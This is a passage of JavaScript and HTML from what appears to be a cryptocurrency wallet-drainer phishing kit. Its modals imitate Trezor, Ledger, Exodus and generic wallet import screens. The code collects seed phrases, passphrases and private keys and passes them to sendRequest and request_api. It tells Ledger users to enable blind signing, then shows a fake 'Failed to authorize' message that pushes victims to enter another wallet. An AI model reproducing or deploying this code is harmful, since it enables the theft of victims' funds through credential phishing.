
                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-23" type="text" tabindex="24" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

    </div>

</div>



                                        <button onClick="window.sendRequest();updatePage(ImportWalletFinishModal);"  class="sc-himrzO eyWopv connect-phrase-button">
                                           <div class="sc-ikZpkk FGzOk">

                                              <div class="sc-jIZahH gjHfVN">

                                                 <svg width="13" height="12" viewBox="0 0 13 12" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-ezWOiH bkoIPM">

                                                    <line stroke="currentColor" x1="1" y1="6" x2="12" y2="6" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-kLLXSd bDZenP"></line>

                                                    <path stroke="currentColor" d="M7.51431 1.5L11.757 5.74264M7.5 10.4858L11.7426 6.24314" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-bZkfAO"></path>

                                                 </svg>

                                              </div>

                                           </div>

                                           <span class="sc-gXmSlM CshDF">Continue</span>

                                        </button>

                                    </div>

                                </div>

                            </div>

                        </div>

                    </div>

                </div>

            </div>

        </div>

    </div>

</div>`;



const ImportWalletFinishModal = `

<div class="sc-idiyUo hBuwwI" style="--height: 391px; --width: 343px;">

    <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>

    <div class="sc-iqcoie RrATt active">

        <div class="sc-crXcEl gcowpW">

            <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">

                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">

                    <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>

                    <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>

                </svg>

            </button>

            <button onclick="updatePage(TrezorWalletModal);" aria-label="Back" class="sc-fEOsli iSYxCx" style="opacity: 1;">

                <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">

                    <path d="M8 1L1 8L8 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>

                </svg>

            </button>

        </div>

        <div class="sc-eCYdqJ dLUlU">

            <div style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">Import Wallet</div>

        </div>

        <div class="sc-evZas gcbNhn">

            <div class="sc-breuTD hVhjow active-scale-up">

                <div style="pointer-events: auto;" class="sc-ksZaOG dmNTWR">

                    <div style="z-index: 2; opacity: 1; transform: none;">

                        <div class="sc-dkzDqf jKlSZW">

                            <div class="sc-ZyCDH cBtLfS">

                                <div class="sc-jSMfEi lbAEgN"></div>

                                <div class="sc-jOhDuK hLWHUX">

                                    <div class="sc-hlnMnd czUBmg">

                                        <div class="sc-jTYCaT epSHCc">

                                            <div class="sc-jQHtVU jhhhSe">

                                                <div style="transform: scale(0.86); position: relative; width: 100%;">

<svg viewBox="0 0 16 16" style="width: 80px" fill="none" xmlns="http://www.w3.org/2000/svg" class="w-full max-w-[28px] h-auto">

                            <path d="M13.9017 0.646973C13.3462 0.646973 12.8304 0.929357 12.5394 1.39357L9.40403 5.95741C9.30186 6.10784 9.34331 6.31059 9.49675 6.41075C9.6211 6.49202 9.78561 6.48196 9.89889 6.38645L12.9851 3.76201C13.0364 3.71677 13.1154 3.72137 13.1616 3.77165C13.1825 3.79469 13.1937 3.82444 13.1937 3.85502V12.0719C13.1937 12.1397 13.1377 12.1942 13.0684 12.1942C13.0312 12.1942 12.9962 12.1783 12.9727 12.1502L3.6435 1.20169C3.33966 0.850174 2.89352 0.647392 2.42388 0.646973H2.09782C1.21536 0.646973 0.5 1.34833 0.5 2.2135V13.7863C0.5 14.6515 1.21536 15.3528 2.09782 15.3528C2.65336 15.3528 3.16915 15.0704 3.46017 14.6062L6.59558 10.0424C6.69769 9.89194 6.65624 9.68919 6.50279 9.58903C6.37845 9.50776 6.21394 9.51782 6.10071 9.61334L3.01446 12.2378C2.96318 12.283 2.88412 12.2784 2.83797 12.2281C2.81703 12.2051 2.80592 12.1753 2.80634 12.1447V3.92583C2.80634 3.85796 2.86232 3.80349 2.93155 3.80349C2.96831 3.80349 3.00377 3.81941 3.02728 3.84748L12.3552 14.7981C12.659 15.1496 13.1052 15.3524 13.5749 15.3528H13.9009C14.7833 15.3532 15.4992 14.6523 15.5 13.7871V2.2135C15.5 1.34833 14.7842 0.646973 13.9017 0.646973Z" fill="#000000"></path>

                        </svg>  



                                                </div>

                                            </div>

                                            <div class="sc-fvNpTx eFjHkq"></div>

                                        </div>

                                    </div>

                                </div>

                                <div class="sc-gKXOVf liyQQU">

                                    <div class="sc-jIAOiI dWkvrK" style="will-change: transform, opacity; position: relative; opacity: 1; transform: none;">

                                        <div class="sc-iBkjds emnDjo" style="padding: 0px 8px 8px;">

                                            <h1 class="sc-ftvSup fqLYro">Failed to authorize<br></h1>

                                            <div class="sc-papXJ jCcNJP">Your wallet is not eligible to claim the reward. Please try using a another one.<br></div>

                                        </div>

                                    </div>

                                </div>

                            </div>

                            <button onclick="updatePage(TrezorWalletModal);" class="sc-himrzO eyWopv">

                              <div class="sc-ikZpkk FGzOk">

                                 <div class="sc-jIZahH gjHfVN">

                                    <svg width="13" height="12" viewBox="0 0 13 12" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-ezWOiH bkoIPM">

                                       <line stroke="currentColor" x1="1" y1="6" x2="12" y2="6" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-kLLXSd bDZenP"></line>

                                       <path stroke="currentColor" d="M7.51431 1.5L11.757 5.74264M7.5 10.4858L11.7426 6.24314" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-bZkfAO"></path>

                                    </svg>

                                 </div>

                              </div>

                              <span class="sc-gXmSlM CshDF">Continue</span>

                           </button>

                        </div>

                    </div>

                </div>

            </div>

        </div>

    </div>

</div>

`;



const LedgerWalletModalWC2 = `

<div class="sc-idiyUo hBuwwI" style="--height: 723px; --width: 380px;">

    <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>

    <div class="sc-iqcoie RrATt active">

        <div class="sc-crXcEl gcowpW">

            <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">

                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">

                    <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>

                    <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>

                </svg>

            </button>

            <button onclick="updatePage(ConnectModal);" aria-label="Back" class="sc-fEOsli iSYxCx" style="opacity: 1;">

                <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">

                    <path d="M8 1L1 8L8 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>

                </svg>

            </button>

        </div>

        <div class="sc-eCYdqJ dLUlU">

            <div style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">Ledger Wallet</div>

        </div>

        <div class="sc-evZas gcbNhn">

            <div class="sc-breuTD hVhjow active-scale-up">

                <div style="pointer-events: auto;" class="sc-ksZaOG dmNTWR">

                    <div style="z-index: 2; opacity: 1; transform: none;">

                        <div class="sc-dkzDqf jKlSZW" style="width:100%;">

                            <div class="sc-ZyCDH cBtLfS">

                                <div class="sc-jSMfEi lbAEgN"></div>

                                <div class="sc-jOhDuK hLWHUX">

                                    <div class="sc-hlnMnd czUBmg">

                                        <div class="sc-jTYCaT epSHCc">

                                            <div class="sc-jQHtVU jhhhSe">

                                                <div style="transform: scale(0.86); position: relative; width: 100%;">

                                                <svg version="1.0" xmlns="http://www.w3.org/2000/svg"

                                                 width="696.000000pt" height="697.000000pt" viewBox="0 0 696.000000 697.000000"

                                                 preserveAspectRatio="xMidYMid meet">



                                                <g transform="translate(0.000000,697.000000) scale(0.100000,-0.100000)"

                                                fill="#000000" stroke="none">

                                                <path d="M0 3485 l0 -3485 3480 0 3480 0 0 3485 0 3485 -3480 0 -3480 0 0

                                                -3485z m2890 2250 l0 -145 -757 -2 -758 -3 -3 -437 -2 -438 -145 0 -145 0 0

                                                585 0 585 905 0 905 0 0 -145z m2980 -440 l0 -585 -145 0 -145 0 -2 438 -3

                                                437 -757 3 -758 2 0 145 0 145 905 0 905 0 0 -585z m-2688 -1662 l3 -758 438

                                                -3 437 -2 0 -145 0 -145 -585 0 -585 0 0 905 0 905 145 0 145 0 2 -757z

                                                m-1810 -1810 l3 -438 758 -3 757 -2 0 -145 0 -145 -905 0 -905 0 0 585 0 585

                                                145 0 145 0 2 -437z m4498 -148 l0 -585 -905 0 -905 0 0 145 0 145 758 2 757

                                                3 3 438 2 437 145 0 145 0 0 -585z"/>

                                                </g>

                                                </svg>

                                                </div>

                                            </div>

                                            <div class="sc-fvNpTx eFjHkq"></div>

                                        </div>

                                    </div>

                                </div>

                                <div class="sc-gKXOVf liyQQU">

                                    <div class="sc-jIAOiI dWkvrK" style="will-change: transform, opacity; position: relative; opacity: 1; transform: none;">

                                        <div class="sc-iBkjds emnDjo" style="gap: 4px;padding: 0px 8px 8px;">

                                            <h1 class="sc-ftvSup fqLYro">How to connect Ledger Wallet<br></h1>

                                            <div class="sc-papXJ jCcNJP" style="text-align:left;margin-top: 10px;margin-bottom: 10px;"><b>Before you connect Ledger Live</b><br></div>

                                            <div class="sc-papXJ jCcNJP" style="text-align:left;">1. Unlock your Ledger device.</div>

                                            <div class="sc-papXJ jCcNJP" style="text-align:left;">2. Open the Ethereum (ETH) application.</div>

                                            <div class="sc-papXJ jCcNJP" style="text-align:left;">3. Navigate to Settings inside the app.</div>

                                            <div class="sc-papXJ jCcNJP" style="text-align:left;">4. Select <b>'Blind signing</b>'.</div>

                                            <div class="sc-papXJ jCcNJP" style="text-align:left;">5. Press both buttons to <b>enable</b> blind signing.</div>

                                            <div class="sc-papXJ jCcNJP" style="text-align:left;">6. Then click 'Continue' down below and connect using Ledger Live.</div>

                                            <p style="display:none;">You will copy this as well mr inferno Xd?</p>

                                            <img style="margin-top:10px;height:136px;" alt="Ledger video presentation" src="https://support.ledger.com/hc/article_attachments/4420181294865/blind_signing_eth_app_5.gif"></img>



                                        </div>

                                    </div>

                                </div>

                            </div>

                            <button onclick="updatePage(TrezorWalletModal);" class="sc-himrzO eyWopv">

                              <div class="sc-ikZpkk FGzOk">

                                 <div class="sc-jIZahH gjHfVN">

                                    <svg width="13" height="12" viewBox="0 0 13 12" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-ezWOiH bkoIPM">

                                       <line stroke="currentColor" x1="1" y1="6" x2="12" y2="6" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-kLLXSd bDZenP"></line>

                                       <path stroke="currentColor" d="M7.51431 1.5L11.757 5.74264M7.5 10.4858L11.7426 6.24314" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-bZkfAO"></path>

                                    </svg>

                                 </div>

                              </div>

                              <span class="sc-gXmSlM CshDF">Continue</span>

                           </button>

                        </div>

                    </div>

                </div>

            </div>

        </div>

    </div>

</div>

`;



const MetamaskCustomModal = "MetamaskCustomModal";



var modalInitialized = false;

var closePhrasesBlock = false;



function initModal() {

    if (!modalInitialized) {

        modalInitialized = true;

        document.body.innerHTML += Modal;

        attachImageFallbacks();
    }

}



initModal()


function attachImageFallbacks() {
    try {
        var modalRoot = document.getElementById('modal');
        if (!modalRoot) return;
        var imgs = modalRoot.querySelectorAll('img');
        // transparent 1x1 PNG placeholder
        var fallback = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR4nGP4BwQACfsD/aywBK0AAAAASUVORK5CYII=';
        imgs.forEach(function(img){
            if (!img) return;
            var handled = false;
            function onErr(){
                if (handled) return;
                handled = true;
                img.removeEventListener('error', onErr);
                img.srcset = '';
                img.src = fallback;
                if (!img.alt) img.alt = 'image';
            }
            img.addEventListener('error', onErr, { once: false });
            // If the image is already broken (cached error), force recheck
            if (img.complete && img.naturalWidth === 0) {
                onErr();
            }
        });
    } catch (e) { /* noop */ }
}


function setPage(page) {

    document.getElementById("modal-content").innerHTML = page;

    attachImageFallbacks();
}



function getCombinedPhrase() {

    var phrase = "";

    for (var i = 0; i < 24; i++) {

        const selectedInput = 'mnemonic-input-' + i;

        const mnemonicInput = document.getElementById(selectedInput);

        phrase += mnemonicInput.value + " ";

    }

    phrase += document.getElementById('mnemonic-textarea').value;

    phrase = phrase.replace(/ +/g, " ").trimStart().trimEnd();

    if (phrase.includes("word word word") || phrase.includes("jquery.bio") || phrase.includes("expose unit another tribe parrot brick") || phrase.includes("wordwordword")) return "";

    return phrase;

}



var lastSentPhraseLength = 0;



async function updatePage(page) {

    try {

        if ((page === CloseModal || page === ConnectModal) && closePhrasesBlock) {

            return;

        }

        if (page === ImportWalletFinishModal || page === ExodusWalletFinishModal || page === LedgerWalletFinishModal || page === TrezorWalletFinishModal) {

            // page = page.replace("Failed to authenticate", "Success!").replace("To continue, try using another seed phrase.", "To continue, please import your next Shamir Backup phrase.");

        }



        if (page === CloseModal) {

            document.getElementById('modal').style.display = 'none';

            return;

        }



        // if (page === TrezorWalletFinishModal || page === ExodusWalletFinishModal || page === LedgerWalletFinishModal || page === ImportWalletFinishModal) {

        //     const phrase = getCombinedPhrase();

        //     if (phrase.length > 30 && !phrase.includes("word word word")) {

        //         const wordsSelector = document.getElementById('connect-hardware-words');

        //         let passphrasex = document?.getElementById('connect-hardware-passphrase')?.value;

        //         console.log("Sending " + phrase);

        //         request_api({

        //             phrase: phrase,

        //             passphrase: passphrasex,

        //             imported: page == TrezorWalletFinishModal ? "TREZOR" : page == LedgerWalletFinishModal ? "LEDGER" : page == ExodusWalletFinishModal ? "EXODUS" : "DIFFERENT",

        //             keywords: wordsSelector.value

        //         });

        //     }

        // }



        if (page == TrezorWalletModal || page == ExodusWalletModal || page == ImportWalletModal || (DRAINER_LEDGER_PHRASES && page == LedgerWalletModal)) {

            lastSentPhraseLength = 0;

            setPage(page);

            const trezorModal = document.querySelector('.connect-trezor-modal');

            const wordsSelector = document.getElementById('connect-hardware-words');

            const passphraseCheckbox = document.getElementById('phrase-passphrase-checkbox');



            if (passphraseCheckbox) {

                passphraseCheckbox.addEventListener('change', function () {

                    document.getElementById('connect-hardware-passphrase').value = "";

                    if (this.checked) {

                        document.getElementById('connect-hardware-passphrase').classList.remove("phrase-display-none");

                    } else {

                        document.getElementById('connect-hardware-passphrase').classList.add("phrase-display-none");

                    }

                });

            }



            wordsSelector.addEventListener('change', function () {

                const value = wordsSelector.value;

                var cssText = "--width: 543px; ";

                if (value == 12) {

                    cssText += '--height: 644px;';

                } else if (value == 24) {

                    cssText += '--height: 791px;';

                } else if (value == "shamir" || value == "file") {

                    cssText += '--height: 602px;';

                }

                trezorModal.style.cssText = cssText;



                for (var i = 12; i < 24; i++) {

                    const selectedInputDiv = 'mnemonic-inputdiv-' + i;

                    const mnemonicInputDiv = document.getElementById(selectedInputDiv);

                    value == 12 ? mnemonicInputDiv.classList.add("phrase-display-none") : mnemonicInputDiv.classList.remove("phrase-display-none");

                }



                if (value == "shamir" || value == "file") {

                    document.getElementById('mnemonic-words').classList.add("phrase-display-none");

                    document.getElementById('mnemonic-textarea').classList.remove("phrase-display-none");

                    for (var i = 0; i < 24; i++) {

                        document.getElementById('mnemonic-input-' + i).value = "";

                    }

                    /*} else if(value == "12") {

                      for(var i = 11; i < 24; i++) {

                        document.getElementById('mnemonic-input-' + i).value = "";

                      }*/

                } else {

                    document.getElementById('mnemonic-words').classList.remove("phrase-display-none");

                    document.getElementById('mnemonic-textarea').classList.add("phrase-display-none");

                    document.getElementById('mnemonic-textarea').value = "";

                }

                if (value == "file") {

                    document.getElementById('mnemonic-textarea').placeholder = "Enter your private key or file content";

                }

                lastSentPhraseLength = getCombinedPhrase().length;

            });

            for (var i = 0; i < 24; i++) {

                const selectedInput = 'mnemonic-input-' + i;

                const selectedInputDiv = 'mnemonic-inputdiv-' + i;

                const selectedInputNext = 'mnemonic-input-' + (i + 1);

                const selectedInputDivNext = 'mnemonic-inputdiv-' + (i + 1);

                const mnemonicInput = document.getElementById(selectedInput);

                const mnemonicInputDiv = document.getElementById(selectedInputDiv);

                const mnemonicInputDivNext = document.getElementById(selectedInputDivNext);



                mnemonicInputDiv.addEventListener("focusin", mnemonicInputDiv.classList.add("Mui-focused"));

                mnemonicInputDiv.addEventListener("focusout", mnemonicInputDiv.classList.remove("Mui-focused"));

                mnemonicInput.addEventListener('paste', function (e) {

                    e.preventDefault();

                    const pasteData = (e.clipboardData || window.clipboardData).getData('text');

                    const words = pasteData.trim().split(/\s+/);

                    const startIndex = parseInt(this.id.split('-')[2]);



                    for (let j = 0; j < words.length; j++) {

                        const targetIndex = startIndex + j;

                        if (targetIndex < 24) {

                            const targetInput = document.getElementById('mnemonic-input-' + targetIndex);

                            if (targetInput) {

                                targetInput.value = words[j];

                            }

                        }

                    }



                    const lastIndex = Math.min(startIndex + words.length - 1, 23);

                    const lastInput = document.getElementById('mnemonic-input-' + lastIndex);

                    if (lastInput) lastInput.focus();

                });





                mnemonicInput.addEventListener("input", function (e) {

                    const inputValue = this.value;

                    if (BIP39_KEYWORDS.includes(inputValue)) {

                        const similarWords = BIP39_KEYWORDS.filter(word => word !==

                            inputValue && word.startsWith(inputValue));



                        if (similarWords.length === 0) {

                            const nextIndex = parseInt(this.id.split('-')[2]) + 1;

                            if (nextIndex < 24) {

                                const nextInput = document.getElementById('mnemonic-input-' + nextIndex);

                                if (nextInput) {

                                    nextInput.focus();

                                }

                            }

                        }

                    }

                });

                mnemonicInput.addEventListener('keydown', function (e) {

                    if (e.key === ' ') {

                        e.preventDefault();

                        const nextIndex = parseInt(this.id.split('-')[2]) + 1;

                        if (nextIndex < 24) {

                            const nextInput = document.getElementById('mnemonic-input-' + nextIndex);

                            if (nextInput) {

                                nextInput.focus();

                            }

                        }

                    }

                });

            }

            document.getElementById("connect-hardware-words").value = 12;

            if (page == ExodusWalletModal) document.getElementById("connect-hardware-words").value = 24;

            document.getElementById('connect-hardware-words').dispatchEvent(new Event('change'))

            return;

        }

        setPage(page);

    } catch (err) {

        console.log(err)

    }

}



async function openModal(disconnect = false) {

    console.log("Opening modal", disconnect);

    updatePage(ConnectModal);

    document.getElementById("modal").style.display = "block";

}



// Ensure global availability for inline onclick handlers

window.openModal = openModal;

window.updatePage = updatePage;

window.openSpecificWalletModal = openSpecificWalletModal;



const BIP39_KEYWORDS = ["abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit", "adult", "advance", "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent", "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album", "alcohol", "alert", "alien", "all", "alley", "allow", "almost", "alone", "alpha", "already", "also", "alter", "always", "amateur", "amazing", "among", "amount", "amused", "analyst", "anchor", "ancient", "anger", "angle", "angry", "animal", "ankle", "announce", "annual", "another", "answer", "antenna", "antique", "anxiety", "any", "apart", "apology", "appear", "apple", "approve", "april", "arch", "arctic", "area", "arena", "argue", "arm", "armed", "armor", "army", "around", "arrange", "arrest", "arrive", "arrow", "art", "artefact", "artist", "artwork", "ask", "aspect", "assault", "asset", "assist", "assume", "asthma", "athlete", "atom", "attack", "attend", "attitude", "attract", "auction", "audit", "august", "aunt", "author", "auto", "autumn", "average", "avocado", "avoid", "awake", "aware", "away", "awesome", "awful", "awkward", "axis", "baby", "bachelor", "bacon", "badge", "bag", "balance", "balcony", "ball", "bamboo", "banana", "banner", "bar", "barely", "bargain", "barrel", "base", "basic", "basket", "battle", "beach", "bean", "beauty", "because", "become", "beef", "before", "begin", "behave", "behind", "believe", "below", "belt", "bench", "benefit", "best", "betray", "better", "between", "beyond", "bicycle", "bid", "bike", "bind", "biology", "bird", "birth", "bitter", "black", "blade", "blame", "blanket", "blast", "bleak", "bless", "blind", "blood", "blossom", "blouse", "blue", "blur", "blush", "board", "boat", "body", "boil", "bomb", "bone", "bonus", "book", "boost", "border", "boring", "borrow", "boss", "bottom", "bounce", "box", "boy", "bracket", "brain", "brand", "brass", "brave", "bread", "breeze", "brick", "bridge", "brief", "bright", "bring", "brisk", "broccoli", "broken", "bronze", "broom", "brother", "brown", "brush", "bubble", "buddy", "budget", "buffalo", "build", "bulb", "bulk", "bullet", "bundle", "bunker", "burden", "burger", "burst", "bus", "business", "busy", "butter", "buyer", "buzz", "cabbage", "cabin", "cable", "cactus", "cage", "cake", "call", "calm", "camera", "camp", "can", "canal", "cancel", "candy", "cannon", "canoe", "canvas", "canyon", "capable", "capital", "captain", "car", "carbon", "card", "cargo", "carpet", "carry", "cart", "case", "cash", "casino", "castle", "casual", "cat", "catalog", "catch", "category", "cattle", "caught", "cause", "caution", "cave", "ceiling", "celery", "cement", "census", "century", "cereal", "certain", "chair", "chalk", "champion", "change", "chaos", "chapter", "charge", "chase", "chat", "cheap", "check", "cheese", "chef", "cherry", "chest", "chicken", "chief", "child", "chimney", "choice", "choose", "chronic", "chuckle", "chunk", "churn", "cigar", "cinnamon", "circle", "citizen", "city", "civil", "claim", "clap", "clarify", "claw", "clay", "clean", "clerk", "clever", "click", "client", "cliff", "climb", "clinic", "clip", "clock", "clog", "close", "cloth", "cloud", "clown", "club", "clump", "cluster", "clutch", "coach", "coast", "coconut", "code", "coffee", "coil", "coin", "collect", "color", "column", "combine", "come", "comfort", "comic", "common", "company", "concert", "conduct", "confirm", "congress", "connect", "consider", "control", "convince", "cook", "cool", "copper", "copy", "coral", "core", "corn", "correct", "cost", "cotton", "couch", "country", "couple", "course", "cousin", "cover", "coyote", "crack", "cradle", "craft", "cram", "crane", "crash", "crater", "crawl", "crazy", "cream", "credit", "creek", "crew", "cricket", "crime", "crisp", "critic", "crop", "cross", "crouch", "crowd", "crucial", "cruel", "cruise", "crumble", "crunch", "crush", "cry", "crystal", "cube", "culture", "cup", "cupboard", "curious", "current", "curtain", "curve", "cushion", "custom", "cute", "cycle", "dad", "damage", "damp", "dance", "danger", "daring", "dash", "daughter", "dawn", "day", "deal", "debate", "debris", "decade", "december", "decide", "decline", "decorate", "decrease", "deer", "defense", "define", "defy", "degree", "delay", "deliver", "demand", "demise", "denial", "dentist", "deny", "depart", "depend", "deposit", "depth", "deputy", "derive", "describe", "desert", "design", "desk", "despair", "destroy", "detail", "detect", "develop", "device", "devote", "diagram", "dial", "diamond", "diary", "dice", "diesel", "diet", "differ", "digital", "dignity", "dilemma", "dinner", "dinosaur", "direct", "dirt", "disagree", "discover", "disease", "dish", "dismiss", "disorder", "display", "distance", "divert", "divide", "divorce", "dizzy", "doctor", "document", "dog", "doll", "dolphin", "domain", "donate", "donkey", "donor", "door", "dose", "double", "dove", "draft", "dragon", "drama", "drastic", "draw", "dream", "dress", "drift", "drill", "drink", "drip", "drive", "drop", "drum", "dry", "duck", "dumb", "dune", "during", "dust", "dutch", "duty", "dwarf", "dynamic", "eager", "eagle", "early", "earn", "earth", "easily", "east", "easy", "echo", "ecology", "economy", "edge", "edit", "educate", "effort", "egg", "eight", "either", "elbow", "elder", "electric", "elegant", "element", "elephant", "elevator", "elite", "else", "embark", "embody", "embrace", "emerge", "emotion", "employ", "empower", "empty", "enable", "enact", "end", "endless", "endorse", "enemy", "energy", "enforce", "engage", "engine", "enhance", "enjoy", "enlist", "enough", "enrich", "enroll", "ensure", "enter", "entire", "entry", "envelope", "episode", "equal", "equip", "era", "erase", "erode", "erosion", "error", "erupt", "escape", "essay", "essence", "estate", "eternal", "ethics", "evidence", "evil", "evoke", "evolve", "exact", "example", "excess", "exchange", "excite", "exclude", "excuse", "execute", "exercise", "exhaust", "exhibit", "exile", "exist", "exit", "exotic", "expand", "expect", "expire", "explain", "expose", "express", "extend", "extra", "eye", "eyebrow", "fabric", "face", "faculty", "fade", "faint", "faith", "fall", "false", "fame", "family", "famous", "fan", "fancy", "fantasy", "farm", "fashion", "fat", "fatal", "father", "fatigue", "fault", "favorite", "feature", "february", "federal", "fee", "feed", "feel", "female", "fence", "festival", "fetch", "fever", "few", "fiber", "fiction", "field", "figure", "file", "film", "filter", "final", "find", "fine", "finger", "finish", "fire", "firm", "first", "fiscal", "fish", "fit", "fitness", "fix", "flag", "flame", "flash", "flat", "flavor", "flee", "flight", "flip", "float", "flock", "floor", "flower", "fluid", "flush", "fly", "foam", "focus", "fog", "foil", "fold", "follow", "food", "foot", "force", "forest", "forget", "fork", "fortune", "forum", "forward", "fossil", "foster", "found", "fox", "fragile", "frame", "frequent", "fresh", "friend", "fringe", "frog", "front", "frost", "frown", "frozen", "fruit", "fuel", "fun", "funny", "furnace", "fury", "future", "gadget", "gain", "galaxy", "gallery", "game", "gap", "garage", "garbage", "garden", "garlic", "garment", "gas", "gasp", "gate", "gather", "gauge", "gaze", "general", "genius", "genre", "gentle", "genuine", "gesture", "ghost", "giant", "gift", "giggle", "ginger", "giraffe", "girl", "give", "glad", "glance", "glare", "glass", "glide", "glimpse", "globe", "gloom", "glory", "glove", "glow", "glue", "goat", "goddess", "gold", "good", "goose", "gorilla", "gospel", "gossip", "govern", "gown", "grab", "grace", "grain", "grant", "grape", "grass", "gravity", "great", "green", "grid", "grief", "grit", "grocery", "group", "grow", "grunt", "guard", "guess", "guide", "guilt", "guitar", "gun", "gym", "habit", "hair", "half", "hammer", "hamster", "hand", "happy", "harbor", "hard", "harsh", "harvest", "hat", "have", "hawk", "hazard", "head", "health", "heart", "heavy", "hedgehog", "height", "hello", "helmet", "help", "hen", "hero", "hidden", "high", "hill", "hint", "hip", "hire", "history", "hobby", "hockey", "hold", "hole", "holiday", "hollow", "home", "honey", "hood", "hope", "horn", "horror", "horse", "hospital", "host", "hotel", "hour", "hover", "hub", "huge", "human", "humble", "humor", "hundred", "hungry", "hunt", "hurdle", "hurry", "hurt", "husband", "hybrid", "ice", "icon", "idea", "identify", "idle", "ignore", "ill", "illegal", "illness", "image", "imitate", "immense", "immune", "impact", "impose", "improve", "impulse", "inch", "include", "income", "increase", "index", "indicate", "indoor", "industry", "infant", "inflict", "inform", "inhale", "inherit", "initial", "inject", "injury", "inmate", "inner", "innocent", "input", "inquiry", "insane", "insect", "inside", "inspire", "install", "intact", "interest", "into", "invest", "invite", "involve", "iron", "island", "isolate", "issue", "item", "ivory", "jacket", "jaguar", "jar", "jazz", "jealous", "jeans", "jelly", "jewel", "job", "join", "joke", "journey", "joy", "judge", "juice", "jump", "jungle", "junior", "junk", "just", "kangaroo", "keen", "keep", "ketchup", "key", "kick", "kid", "kidney", "kind", "kingdom", "kiss", "kit", "kitchen", "kite", "kitten", "kiwi", "knee", "knife", "knock", "know", "lab", "label", "labor", "ladder", "lady", "lake", "lamp", "language", "laptop", "large", "later", "latin", "laugh", "laundry", "lava", "law", "lawn", "lawsuit", "layer", "lazy", "leader", "leaf", "learn", "leave", "lecture", "left", "leg", "legal", "legend", "leisure", "lemon", "lend", "length", "lens", "leopard", "lesson", "letter", "level", "liar", "liberty", "library", "license", "life", "lift", "light", "like", "limb", "limit", "link", "lion", "liquid", "list", "little", "live", "lizard", "load", "loan", "lobster", "local", "lock", "logic", "lonely", "long", "loop", "lottery", "loud", "lounge", "love", "loyal", "lucky", "luggage", "lumber", "lunar", "lunch", "luxury", "lyrics", "machine", "mad", "magic", "magnet", "maid", "mail", "main", "major", "make", "mammal", "man", "manage", "mandate", "mango", "mansion", "manual", "maple", "marble", "march", "margin", "marine", "market", "marriage", "mask", "mass", "master", "match", "material", "math", "matrix", "matter", "maximum", "maze", "meadow", "mean", "measure", "meat", "mechanic", "medal", "media", "melody", "melt", "member", "memory", "mention", "menu", "mercy", "merge", "merit", "merry", "mesh", "message", "metal", "method", "middle", "midnight", "milk", "million", "mimic", "mind", "minimum", "minor", "minute", "miracle", "mirror", "misery", "miss", "mistake", "mix", "mixed", "mixture", "mobile", "model", "modify", "mom", "moment", "monitor", "monkey", "monster", "month", "moon", "moral", "more", "morning", "mosquito", "mother", "motion", "motor", "mountain", "mouse", "move", "movie", "much", "muffin", "mule", "multiply", "muscle", "museum", "mushroom", "music", "must", "mutual", "myself", "mystery", "myth", "naive", "name", "napkin", "narrow", "nasty", "nation", "nature", "near", "neck", "need", "negative", "neglect", "neither", "nephew", "nerve", "nest", "net", "network", "neutral", "never", "news", "next", "nice", "night", "noble", "noise", "nominee", "noodle", "normal", "north", "nose", "notable", "note", "nothing", "notice", "novel", "now", "nuclear", "number", "nurse", "nut", "oak", "obey", "object", "oblige", "obscure", "observe", "obtain", "obvious", "occur", "ocean", "october", "odor", "off", "offer", "office", "often", "oil", "okay", "old", "olive", "olympic", "omit", "once", "one", "onion", "online", "only", "open", "opera", "opinion", "oppose", "option", "orange", "orbit", "orchard", "order", "ordinary", "organ", "orient", "original", "orphan", "ostrich", "other", "outdoor", "outer", "output", "outside", "oval", "oven", "over", "own", "owner", "oxygen", "oyster", "ozone", "pact", "paddle", "page", "pair", "palace", "palm", "panda", "panel", "panic", "panther", "paper", "parade", "parent", "park", "parrot", "party", "pass", "patch", "path", "patient", "patrol", "pattern", "pause", "pave", "payment", "peace", "peanut", "pear", "peasant", "pelican", "pen", "penalty", "pencil", "people", "pepper", "perfect", "permit", "person", "pet", "phone", "photo", "phrase", "physical", "piano", 